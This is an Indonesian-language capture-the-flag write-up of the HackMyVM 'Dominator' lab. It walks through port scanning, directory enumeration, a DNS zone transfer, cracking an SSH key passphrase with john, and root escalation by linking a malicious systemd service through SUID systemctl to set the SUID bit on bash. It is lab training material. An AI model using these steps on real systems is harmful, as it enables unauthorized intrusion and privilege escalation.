---
layout: Post
title: HackMyVM - Dominator Writeup
date: 2021-10-21 10:33 WIB  
---
<h1 align="center" style="font-size:30px;">
  <br>
  <a href="https://downloads.hackmyvm.eu/dominator.zip">Texte</a>
  <br>
</h1>

<h4 align="center"> Author: <a href="https://twitter.com/d4t4s3c">d4t4s3c</a></h4>

## NMAP

Oke seperti biasa pertama yang kita lakukan ialan scan port yang ada di dalam vm tersebut dengan `nmap` :

```console
──(kiyo㉿alpacentauri)-[~/Web Attack/HackMyVM/DOminator]
└─$ nmap -A -p- 192.168.0.199
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-21 09:59 WIB
Nmap scan report for dominator.hmv (192.168.0.199)
Host is up (0.00062s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
53/tcp    open  domain  (unknown banner: not currently available)
| dns-nsid: 
|_  bind.version: not currently available
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    currently available
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
65222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f7:ea:48:1a:a3:46:0b:bd:ac:47:73:e8:78:25:af:42 (RSA)
|   256 2e:41:ca:86:1c:73:ca:de:ed:b8:74:af:d2:06:5c:68 (ECDSA)
|_  256 33:6e:a2:58:1c:5e:37:e1:98:8c:44:b1:1c:36:6d:75 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.91%I=7%D=10/21%Time=6170D7A2%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,52,"\0P\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\
SF:x04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x18\x17not\x20curre
SF:ntly\x20available\xc0\x0c\0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP

Next setelah kita tahu adanya port 80, kita scan directory apa saja yang ada di web tersebut dengan `gobuster` :

```console
┌──(kiyo㉿alpacentauri)-[~/Web Attack/HackMyVM/DOminator]
└─$ gobuster dir -u http://192.168.0.199 -x php,html,js,txt,png,jpg -w ~/Downloads/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.199
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kiyo/Downloads/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,png,jpg,php,html,js
[+] Timeout:                 10s
===============================================================
2021/10/21 09:45:57 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/robots.txt           (Status: 200) [Size: 14]   
/server-status        (Status: 403) [Size: 278]  
===============================================================
```

Oke next kita lihat apa si isi dari robots.txt dan ternyata terdapat kata `dominator.hmv`. Oleh karena itu ku coba dig untuk mencari informasi :

```console
┌──(kiyo㉿alpacentauri)-[~/Web Attack/HackMyVM/DOminator]
└─$ dig axfr @192.168.0.199 dominator.hmv                                                                                                                           1 ⨯

; <<>> DiG 9.16.15-Debian <<>> axfr @192.168.0.199 dominator.hmv
; (1 server found)
;; global options: +cmd
dominator.hmv.		604800	IN	SOA	ns1.dominator.hmv. root.dominator.hmv. 2 604800 86400 2419200 604800
dominator.hmv.		604800	IN	NS	ns1.dominator.hmv.
admin.dominator.hmv.	604800	IN	A	192.168.0.12
ns1.dominator.hmv.	604800	IN	A	127.0.0.1
secret.dominator.hmv.	604800	IN	TXT	"/fhcrefrperg"
www.dominator.hmv.	604800	IN	A	192.168.0.11
dominator.hmv.		604800	IN	SOA	ns1.dominator.hmv. root.dominator.hmv. 2 604800 86400 2419200 604800
;; Query time: 8 msec
;; SERVER: 192.168.0.199#53(192.168.0.199)
;; WHEN: Thu Oct 21 10:15:43 WIB 2021
;; XFR size: 7 records (messages 1, bytes 255)
```

Dan ternyata terdapat cipher ROT13. Oleh karena itu ku coba decode dengan `https://rot13.com/`. Dan terdapatlah :

```console
cipher : /fhcrefrperg
output : /supersecret
```

Oleh karena itu ku buka di website and boom terdapat sebuah ssh key, dan karena itu ku coba bruteforce dengan john :

```console
┌──(kiyo㉿alpacentauri)-[~/Web Attack/HackMyVM/T800]
└─$ /opt/john/run/ssh2john.py hans_key >hash         
                                                                                                                                                        
┌──(kiyo㉿alpacentauri)-[~/Web Attack/HackMyVM/T800]
└─$ john hash                                                                                                                                                     
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
a*****           (hans_key)
3g 0:00:00:04  3/3 0.6607g/s 110044p/s 110044c/s 110044C/s astlee
Session aborted
```

## SSH

Oke next login ssh dan user berhasil di dapetin. Oya sebelumnya file user.txt nya telah dihapus jadi ku cari dengan `find / -name user.txt 2>/dev/null` :

```console
note
hans@Dominator:~$ cat note 

the flag "user.txt" was removed .. maybe it's in the trash or maybe not ..

hans@Dominator:~$ find / -name user.txt 2>/dev/null
/home/hans/.local/share/Trash/files/user.txt
hans@Dominator:~$ head /home/hans/.local/share/Trash/files/user.txt
S**********************
```

Next ku coba cari cara untuk masuk ke shell root :

```console
hans@Dominator:~$ find / -perm -4000 2>/dev/null
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/umount
/usr/bin/systemctl
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Next ternyata terdapat di `systemctl` yang dimana sebuah SUID yang diperbolehkan dieksekusi oleh hans :

```console
hans@Dominator:~$ TF=$(mktemp).service
hans@Dominator:~$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod +s /usr/bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
hans@Dominator:~$ systemctl link $TF
Created symlink /etc/systemd/system/tmp.TqvIU9SlzE.service → /tmp/tmp.TqvIU9SlzE.service.
hans@Dominator:~$ systemctl enable --now $TF
Created symlink /etc/systemd/system/multi-user.target.wants/tmp.TqvIU9SlzE.service → /tmp/tmp.TqvIU9SlzE.service.
hans@Dominator:~$ bash -p
```

And boom dapetlah shell root dan root.txt :

```console
bash-5.0# cd /root
bash-5.0# ls
root.txt
bash-5.0# cat root.txt 
Z**********************
bash-5.0# 
```
